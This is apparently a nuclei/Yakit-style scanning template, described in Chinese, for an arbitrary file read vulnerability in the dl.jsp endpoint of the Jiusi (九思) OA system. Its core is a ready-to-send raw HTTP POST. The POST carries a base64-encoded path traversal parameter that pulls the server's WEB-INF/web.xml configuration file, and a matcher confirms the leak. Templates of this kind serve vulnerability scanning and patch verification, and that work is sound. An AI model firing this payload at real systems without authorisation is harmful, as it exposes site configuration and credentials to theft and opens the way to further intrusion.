id: 九思OA_dl.jsp任意文件读取

info:
  name: 九思OA_dl.jsp任意文件读取
  author: god
  severity: high
  description: 九思OA_dl.jsp接口处存在任意文件读取漏洞，攻击者可以利用该漏洞访问系统的关键文件，如配置文件，从而使网站处于极高的安全风险之中，严重影响系统的安全性，增加遭受进一步攻击的可能性。
  reference:
  - https://github.com/
  - https://cve.mitre.org/
  metadata:
    max-request: 1
    shodan-query: ""
    verified: true
  yakit-info:
    sign: 0373a916523f43dd11d44899bfea9d8d

http:
- raw:
  - |+
    @timeout: 30s
    POST /jsoa/dl.jsp?JkZpbGVOYW1lPS4uLy4uLy4uL1dFQi1JTkYvd2ViLnhtbCZwYXRoPS9h HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
    Content-Type: application/x-www-form-urlencoded
    Accept-Encoding: gzip
    Connection: close
    Content-Length: 0


  max-redirects: 3
  disable-cookie: true
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - version="1.0"
    - display-name
    condition: and
